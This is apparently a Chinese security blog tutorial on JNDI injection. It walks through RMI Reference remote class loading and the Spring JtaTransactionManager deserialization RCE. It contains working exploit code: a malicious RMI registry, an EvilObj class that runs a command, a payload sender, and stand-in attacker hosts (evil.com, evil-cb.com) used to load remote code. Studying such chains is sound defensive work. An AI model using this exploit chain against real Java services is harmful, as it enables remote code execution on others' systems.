> 原文链接: https://www.anquanke.com//post/id/233629 


# JDNI注入学习


                                阅读量   
                                **124561**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01117ac08843b132e6.jpg)](https://p0.ssl.qhimg.com/t01117ac08843b132e6.jpg)



## 关于JNDI

JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。

JNDI支持多种命名和目录提供程序（Naming and Directory Providers），前文提到过的RMI注册表服务提供程序`（RMI Registry Service Provider）`允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。

JNDI的应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。

我们要使用JNDI，必须要有服务提供方，常用的就是JDBC驱动提供数据库连接服务，然后我们配置JNDI连接。

JDK也为我们提供了一些服务接口：
<li style="list-style-type: none;">
<ol>
- LDAP （Lightweight Directory Access Protocol） 轻量级目录访问协议
</ol>
<ol>
- CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务
</ol>
<ol>
- RMI（Java Remote Method Invocation）JAVA远程远程方法调用注册
</ol>
<ol>
- DNS（Domain Name Service）域名服务
</ol>
</li>
JNDI结构图如下:

[![](https://p4.ssl.qhimg.com/t01b3ff9d2631340f80.png)](https://p4.ssl.qhimg.com/t01b3ff9d2631340f80.png)

代码格式

```
String jndiName= ...;//指定需要查找name名称
Context context = new InitialContext();//初始化默认环境
DataSource ds = (DataSourse)context.lookup(jndiName);//查找该name的数据
```

举个例子，当我们需要开发访问`Mysql`数据库时，需要用JDBC的URL连接到数据库:

```
Connection conn=null;
try `{`
  Class.forName("com.mysql.jdbc.Driver",
                true, Thread.currentThread().getContextClassLoader());
  conn=DriverManager.
    getConnection("jdbc:mysql://MyDBServer?user=Crispr&amp;password=Crispr");
  ......//对conn的相关数据库操作
  conn.close();
`}` catch(Exception e) `{`
  e.printStackTrace();
`}` finally `{`
  if(conn!=null) `{`
    try `{`
      conn.close();
    `}` catch(SQLException e) `{``}`
  `}`
`}`
```

在不使用JDNI情况下可能存在如下问题:
- 1、数据库服务器名称MyDBServer 、用户名和口令都可能需要改变，由此引发JDBC URL需要修改；
- 2、数据库可能改用别的产品，如改用DB2或者Oracle，引发JDBC驱动程序包和类名需要修改；
- 3、随着实际使用终端的增加，原配置的连接池参数可能需要调整；
当我们想使用`JDNI`时，可以通过设定一个数据源(mysql.xml)，将JDBC的URL，驱动类名，用户名及密码都绑定到源上，之后便只需要引用该数据源即可:

```
Connection conn=null;
try `{`
  Context ctx=new InitialContext();
  Object datasourceRef=ctx.lookup("java:MySqlDS"); //引用数据源
  DataSource ds=(Datasource)datasourceRef;
  conn=ds.getConnection();
  ......
  c.close();
`}` catch(Exception e) `{`
  e.printStackTrace();
`}` finally `{`
  if(conn!=null) `{`
    try `{`
      conn.close();
    `}` catch(SQLException e) `{` `}`
  `}`
`}`
```

回到之前，这里本文也是主要对利用JNDI结合RMI的相关缺陷进行学习和分析<br>
JNDI引用RMI远程对象时:

```
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup("rmi://127.0.0.1:1099/Exploit");
```

> 注：InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一

这里分析部分有关JNDI可利用的漏洞，不过在此之前，我们先通过一个小demo来实现JNDI调用远程对象:<br>
首先，如果方法想要被远程调用，必须实现`Remote`接口，并抛出`RemoteException`异常，而如果对象需要被远程调用，则需要实现`java.rmi.server.UniCastRemoteObject`类

创建需要被远程调用的方法的接口:

```
public interface HelloWorld extends Remote`{`
        public String Hello() throws RemoteException; //定义的方法需要抛出RemoteException的异常
        public String HelloWorld() throws RemoteException;
        /*
        * 由于任何远程方法调用实际上要进行许多低级网络操作，因此网络错误可能在调用过程中随时发生。
           因此，所有的RMI操作都应放到try-catch块中
        * */
    `}`
```

创建`RemoteHelloWorld`类并且继承`java.rmi.server.UniCastRemoteObject`类并且实现了方法接口:

```
public static class RemoteHelloWorld extends UnicastRemoteObject implements HelloWorld`{`
        protected RemoteHelloWorld() throws RemoteException `{` //需要抛出一个Remote异常的默认初始方法
        `}`
        @Override
        public String Hello() throws RemoteException `{` //实现接口的方法
            return "Hello World!";
        `}`
        @Override
        public String HelloWorld() throws RemoteException`{`
            return "This is another method";
        `}`
    `}`
```

创建注册中心，并且将远程对象类进行绑定:

```
private void start() throws Exception`{`
        RemoteHelloWorld rhw = new RemoteHelloWorld();
        System.out.println("registry is running...");
        //创建注册中心
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/hello",rhw);
    `}`
```

最后使用`JNDI`去获取并调用对象方法:

```
public static void main(String[] args) throws Exception`{`
        //创建远程对象实例
        new RMIServer().start();
        // 配置 JNDI 默认设置
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL,
                "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        HelloWorld helloWorld = (HelloWorld)ctx.lookup("hello");
        System.out.println(helloWorld.Hello());
        System.out.println(helloWorld.HelloWorld());
    `}`
```

[![](https://p1.ssl.qhimg.com/t01916a786bd4771012.png)](https://p1.ssl.qhimg.com/t01916a786bd4771012.png)

自此完成了RMI的远程调用方法，不过需要注意的是方法调用仍然是在远程执行，得到的数据通过序列化传递给本地stub中传回至客户端

在学习JNDI References注入之前，还需要了解一些知识，即`RMI中动态加载字节代码`



## RMI中动态加载字节代码

如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。

Reference 中几个比较关键的属性：
- className – 远程加载时所使用的类名
- classFactory – 加载的 class 中需要实例化类的名称
- classFactoryLocation – 提供 classes 数据的地址可以是 file/ftp/http 等协议
例如这里定义一个 Reference 实例，并使用继承了 UnicastRemoteObject 类的 ReferenceWrapper 包裹一下实例对象，使其能够通过 RMI 进行远程访问：

```
//定义一个Reference类，其远程加载使用的类名为refClassName
Reference refObj = new Reference("refClassName", "insClassName", "http://example.com:12345/");
//使用ReferenceWrappper进行包裹
ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
进行绑定
registry.bind("refObj", refObjWrapper);
```

有客户端通过`lookup("refObj")`获取远程对象时，获得到一个`Reference` 类的存根，由于获取的是一个`Reference`实例，客户端会首先去本地的 CLASSPATH去寻找被标识为`refClassName`的类，如果本地未找到，则会去请求 `http://example.com:12345/refClassName.class`动态加载classes 并调用insClassName的构造函数。



## JNDI 协议动态转换

我们知道，在初始化配置`JNDI`设置时可以预先指定其上下文环境()RMI、LDAP 或者CORBA等):

```
Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL,
                "rmi://localhost:1099");
```

当调用`lookup()`方法时通过URI中规定的协议能够动态的调整上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：

```
ctx.lookup("ldap://xxxxx:2333/");
```

这里不妨跟进实现过程,调用`lookup()`方法后进入`InitialContext`类，调用`getURLOrDefaultInitCtx`的`lookup()`方法:

[![](https://p3.ssl.qhimg.com/t019fec07cd89cb622e.png)](https://p3.ssl.qhimg.com/t019fec07cd89cb622e.png)

继续跟进:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b5c6c50c2ade0803.png)

通过`String scheme = getURLScheme(name);`获取获取协议,如果`name`中包含特定的`Schema`协议，代码则会使用相应的工厂去初始化上下文环境，这时候不管之前配置的工厂环境是什么，这里都会被动态地对其进行替换。



## JNDI References注入 思路

这里不妨调试客户端`lookup()`对`Reference`类的处理情况:

[![](https://p0.ssl.qhimg.com/t016b2dc4ece8f74cc1.png)](https://p0.ssl.qhimg.com/t016b2dc4ece8f74cc1.png)

```
private Object decodeObject(Remote var1, Name var2) throws NamingException `{`
        try `{`
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        `}` catch (NamingException var5) `{`
            throw var5;
        `}` catch (RemoteException var6) `{`
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        `}` catch (Exception var7) `{`
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        `}`
    `}`
```

可以看到先调用`RegistryContext.decodeObject()`方法，在此处进行了是否属于`Reference`类的判断，如果是则调用`RemoteReference.getReference()`方法,然后调用`NamingManager.getObjectInstance`方法，接着会调用`factory.getObjectInstance`方法，如果factory不为空的话，因为这里是随便构造的Reference类，使`factory`为空了:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0199443ba56fd9b2e0.png)

因此其调用链情况为:

```
lookup()-&gt; RegistryContext.decodeObject()-&gt; NamingManager.getObjectInstance()-&gt; factory.getObjectInstance()
```

总的来说，就是当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。

因此当代码调用了InitialContext.lookup(URI)，且URI为用户可控，我们可以控制URI为恶意的RMI服务器地址，根据**JNDI 协议动态转换**,即使之前并不是RMI的上下文环境配置，也会因为URI中的RMI协议而转换为RMI的环境配置

攻击者RMI服务器向目标返回一个Reference对象，`Reference`对象中指定某个精心构造的Factory类；

目标在进行`lookup()`操作时，会动态加载并实例化Factory类，接着调用`factory.getObjectInstance()`获取外部远程对象实例

[![](https://p0.ssl.qhimg.com/t01aae5a33a587d39a3.png)](https://p0.ssl.qhimg.com/t01aae5a33a587d39a3.png)

攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；

上述所说的JNDI注入都是基于以下三个方面:
- JNDI 调用中 lookup() 参数可控
- 使用带协议的 URI 可以进行动态环境转换
- Reference 类动态代码获取进行实例化
用一张图来说明下攻击思路:

[![](https://p3.ssl.qhimg.com/t01fbdbb6ce8f510c64.png)](https://p3.ssl.qhimg.com/t01fbdbb6ce8f510c64.png)

这里详细说明攻击思路:<br>
当`lookup()`内参数可控时，由于动态转换的特性，我们可以构造一个恶意的RMI服务器，例如`rmi://evil.com:1099/refObj`，此时客户端请求绑定对象`refObj`，而恶意RMI服务器中与`refObj`相绑定的是一个`ReferenceWrapper`对象(`Reference("EvilObject", "EvilObject", "http://evil-cb.com/")`)

由于本地`ClassPath`并没有该类，因此会从指定url中加载`EvilObject.class`

因此我们只需要准备一个恶意的`EvilObject.class`，在其构造函数包含恶意代码时，便能使得客户端执行恶意代码

下面简单的演示该思路实现的具体代码:

编写RMI服务端:

```
package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer `{`
    public static void main(String[] args) throws Exception `{`
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilObj","EvilObj","http://127.0.0.1:2333/EvilObj");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(refObj);
        System.out.println("Binding to rmi://127.0.0.1:1099/refObj...");
        registry.bind("refObj",referenceWrapper);
        System.out.println("Bind!");
    `}`
`}`
```

服务端所需要做的就是将`reference类`通过`ReferenceWrapper`包裹后通过注册中心进行绑定，以便于客户端去请求得到该远程类

编写RMI客户端类:

```
package JNDI;

import javax.naming.Context;
import javax.naming.InitialContext;

public class RMIClient `{`
    public static void main(String[] args)  throws  Exception`{`
        String uri = "http://127.0.0.1:2333/EvilObj";
        Context ctx = new InitialContext();
        System.out.println("Being Looking up");
        ctx.lookup(uri);
    `}`
`}`
```

客户端这里直接将可控数据写入，`uri`即是我们可控的数据，这里直接演示将可控数据替换为构造好的恶意RMI服务器的地址，调用`lookup()`去获得远程类`EvilObj`

编写恶意类文件EvilObj

```
public class EvilObj `{`
    public EvilObj() throws Exception`{`
        Runtime runtime = Runtime.getRuntime();
        String command = "calc.exe";
        runtime.exec(command);
    `}`
`}`
```

在此过程中，我们知道客户端通过`lookup()`获取远程对象时，获得一个`Reference`类的`stub`,由于其为`Reference`实例，客户端首先加载本地`CLASSPATH`查询名为`EvilObj`的类，如果没有找到，则会去请求`http://127.0.0.1:2333/EvilObj.class`来动态加载该类，并且调用`EvilObj`的构造方法

> 注意为了避免加载本地CLASSPATH中的EvilObj类，可以将本地生成的`EvilObj.class`和`EvilObj.java`删除或者转移到其他目录下,或者直接使用javac将文件编译

最终成功调用`EvilObj`的构造方法实现RCE

[![](https://p2.ssl.qhimg.com/t019b0e8d33e749989e.png)](https://p2.ssl.qhimg.com/t019b0e8d33e749989e.png)

但是尽管可以执行，在客户端却会抛出异常，这里经过调试发现:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cf081d835078bdad.png)

在此处实例化该类(`EvilObj`)后会实现类型转化为`ObjectFactory`类，而该类实际上是一个接口，因此我们需要在编写`EvilObj`类时实现该接口，该接口仅定义了一个方法:

[![](https://p4.ssl.qhimg.com/t01f8be3246c2a673b7.png)](https://p4.ssl.qhimg.com/t01f8be3246c2a673b7.png)

因此这里利用前文所述，在`getObjectInstance()`方法写入恶意代码，只需要改写`EvilObj.java`即可:

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class EvilObj implements ObjectFactory `{`
    public EvilObj() throws Exception`{`
    `}`
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception `{`
    //恶意代码放到getObjectInstance中
        Runtime runtime = Runtime.getRuntime();
        String cmd = "calc.exe";
        Process pc = runtime.exec(cmd);
        pc.waitFor();
        return null;
    `}`
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01aa8c8760f26f9648.png)

现在便不会抛出异常，因为该类可以类型转化为`ObjectFactory`，跟进调试查看:<br>`NamingManager.java`中可以发现此时factory类不为null,该类就是`EvilObj`类型转化为对象工厂的实例

[![](https://p3.ssl.qhimg.com/t01db5d19d54f0bc3db.png)](https://p3.ssl.qhimg.com/t01db5d19d54f0bc3db.png)

再通过`getObjectInstance()`获取外部远程对象实例`EvilObj`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cb462adcd0a23ca2.png)

因此我们重写`getObjectInstance`方法，写入恶意代码，也会得以执行



## Spring Framework 反序列化 RCE漏洞分析

选择版本为`Spring Framework 3.2.4`

Spring 框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的`org.springframework.transaction.jta.JtaTransactionManager`类，该类实现了`Java Transaction API`，主要功能是处理分布式的事务管理，既然是反序列化漏洞，我们直接定位到`readObject()`方法即可:

[![](https://p4.ssl.qhimg.com/t01794fb3ae7407d6bd.png)](https://p4.ssl.qhimg.com/t01794fb3ae7407d6bd.png)

跟进`initUserTransactionAndTransactionManager()`方法:

```
protected void initUserTransactionAndTransactionManager() throws TransactionSystemException `{`
        // Fetch JTA UserTransaction from JNDI, if necessary.
        if (this.userTransaction == null) `{`
            if (StringUtils.hasLength(this.userTransactionName)) `{`
                this.userTransaction = lookupUserTransaction(this.userTransactionName);
                this.userTransactionObtainedFromJndi = true;
            `}`
            else `{`
                this.userTransaction = retrieveUserTransaction();
            `}`
        `}`

        // Fetch JTA TransactionManager from JNDI, if necessary.
        if (this.transactionManager == null) `{`
            if (StringUtils.hasLength(this.transactionManagerName)) `{`
            //可以看到在这里调用了lookupUserTransaction方法
                this.transactionManager = lookupTransactionManager(this.transactionManagerName);
            `}`
            else `{`
                this.transactionManager = retrieveTransactionManager();
            `}`
        `}`

        // Autodetect UserTransaction at its default JNDI location.
        if (this.userTransaction == null &amp;&amp; this.autodetectUserTransaction) `{`
            this.userTransaction = findUserTransaction();
        `}`

        // Autodetect UserTransaction object that implements TransactionManager,
        // and check fallback JNDI locations else.
        if (this.transactionManager == null &amp;&amp; this.autodetectTransactionManager) `{`
            this.transactionManager = findTransactionManager(this.userTransaction);
        `}`

        // If only JTA TransactionManager specified, create UserTransaction handle for it.
        if (this.userTransaction == null &amp;&amp; this.transactionManager != null) `{`
            this.userTransaction = buildUserTransaction(this.transactionManager);
        `}`
    `}`
```

注释中明确提到支持通过配置好的transaction名称用JNDI的方式进行查找，而`this.transactionManagerName`是可控的，可以通过`setTransactionManagerName()`方法来赋值，不妨跟进`lookupUserTransaction`:

[![](https://p2.ssl.qhimg.com/t017385b472123c6dde.png)](https://p2.ssl.qhimg.com/t017385b472123c6dde.png)

最终会调用JndiTemplate的lookup方法，如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d04660a3371ec7ff.png)

因此这又回到了JNDI注入的问题上，之所以称之为反序列化漏洞，可能是因为利用入口点在`readObject()`方法上，但是思路都是JNDI注入的思路

对于该漏洞，我们所利用的也是三个地方:
- userTransactionName，可以指定为攻击者自己注册的RMI服务。
- codebase url，远程调用类的路径（攻击者可控）
- JtaTransactionManager类中的readObject方法在反序列化事触发了JNDI的RCE
### <a class="reference-link" name="Spring%20Framework%20Demo%E6%BC%94%E7%A4%BA"></a>Spring Framework Demo演示

参考Github上已有的演示demo: [https://github.com/zerothoughts/spring-jndi](https://)

**客户端**<br>
这里`Clinet`客户端的编写思路和之前差不多:

```
package SpringVuln;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.springframework.transaction.jta.JtaTransactionManager;

import javax.naming.Reference;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ClientExploit `{`
    /***
     * 启动RMI服务
     *
     * @throws Exception
     */
    public static void lanuchRMIregister() throws Exception`{`
        System.out.println("Creating RMI register...");
        Registry registry = LocateRegistry.createRegistry(1099);
        // 最终下载恶意类的地址为http://127.0.0.1:9999/SpringExploitObj.class
        Reference refObj = new Reference("EvilObj","EvilObj","http://127.0.0.1:9999/");
        //使用ReferenceWrapper包装，其继承了UnicastRemoteObject因此实现了Remote接口
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj",referenceWrapper);
    `}`
    /***
     * 发送payload
     *
     * @throws Exception
     */
    public static  void sendPayload() throws Exception`{`
        //定义jndi的调用地址
        String uri = "rmi://127.0.0.1:1099/refObj";
        //实例化利用类JtaTransactionManager
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        //调用setUserTransactionName方法从而控制userTransactionName
        jtaTransactionManager.setUserTransactionName(uri);
        //发送经过序列化后的Payload，等待服务端实例化时反序列化触发漏洞
        Socket socket = new Socket("127.0.0.1",2333);
        System.out.println("Sending Payload...");
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        oos.writeObject(jtaTransactionManager);
        oos.flush();
        oos.close();
        socket.close();
    `}`

    public static void main(String[] args) throws Exception`{`
        lanuchRMIregister();
        sendPayload();
    `}`
`}`
```

**服务端**<br>
服务端只需将得到的数据反序列化即可:

```
package SpringVuln;

import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class ServerExploit `{`
    public static void main(String[] args) `{`
        try `{`
            //create socket
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt("2333"));
            System.out.println("Server started on port "+serverSocket.getLocalPort());
            while(true) `{`
                //wait for connect
                Socket socket=serverSocket.accept();
                System.out.println("Connection received from "+socket.getInetAddress());
                ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
                try `{`
                    //readObject to DeSerialize
                    Object object = objectInputStream.readObject();
                    System.out.println("Read object "+object);
                `}` catch(Exception e) `{`
                    System.out.println("Exception caught while reading object");
                    e.printStackTrace();
                `}`
            `}`
        `}` catch(Exception e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

恶意类仍然使用之前的`EvilObj`类即可，因为只是简单模拟命令执行操作:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cef6e27d7386fa17.png)

**执行流程**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f0fcef0c3479b072.png)

但是在执行过程中，服务端同样出现了抛出异常的处理，因此我们在通过动态调试来跟进整个利用过程，并且找到抛出异常的原因

[![](https://p1.ssl.qhimg.com/t01b601cfef67e040b2.png)](https://p1.ssl.qhimg.com/t01b601cfef67e040b2.png)

**动调跟进**<br>
在`JtaTransactionManager`中`readObject`下断点:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017aaf3cbbfb2837c9.png)

跟进`initUserTransactionAndTransactionManager()`方法:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013e73f73ca1c11d54.png)

继续跟进`lookupUserTransaction()`方法，此时`this.userTransactionName`已经被赋值为`rmi://127.0.0.1:1099`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f4cf21f7cf825ecd.png)

继续跟进`lookup()`方法,最终调用`ctx.lookup()`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010784645372e72241.png)

这里因JNDI的动态转换，因此会切换到RMI的上下文环境，最终判断该类是否为`Reference`对象类，本地`CLASSPATH`查询失败后再去远程加载EvilObj类

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d9a039b78d8a45f2.png)

后续和前文利用JNDI注入的分析过程一致，在这里就不重复了，当然恶意代码可以写在远程加载class中的构造方法中，也可以重写`getObjectInstance()`方法，嵌入到其中。

因此总的来说，`Spring FrameWork`这个反序列化漏洞，整体的核心思路还是JNDI注入的思路，只是在整个`Gadget Chains`的入口是通过`readObject()`得以触发。

**总结**<br>
注意并不是使用`Spring`框架开发就会存在此漏洞的利用，原因是因为成功利用JNDI注入需要满足三个方面:
- 1.存在对象的反序列化，因为反序列化`readObject`是入口
- 2.由于需要进行远程类下载，因此要求主机必须能够出网
- 3.CLASSPATH中存在`Spring-tx-xx.jar`的有缺陷的jar包
对于前两个问题来说，条件都是比较能够满足的，例如JBOSS、Weblogic、Jenkins等中间件都存在反序列化之处，但是并不是所有基于`Spring`开发都会使用`Spring-tx-xxx.jar`包，该包并不是这些中间件的默认组件，在这里只是利用该漏洞对JNDI注入有一个更深入的认识。

**最后如有认识错误或者说明不当，还请多多指正和谅解！**

参考链接:

[https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/](https://)

[https://security.tencent.com/index.php/blog/msg/131](https://)

[https://github.com/zerothoughts/spring-jndi](https://)
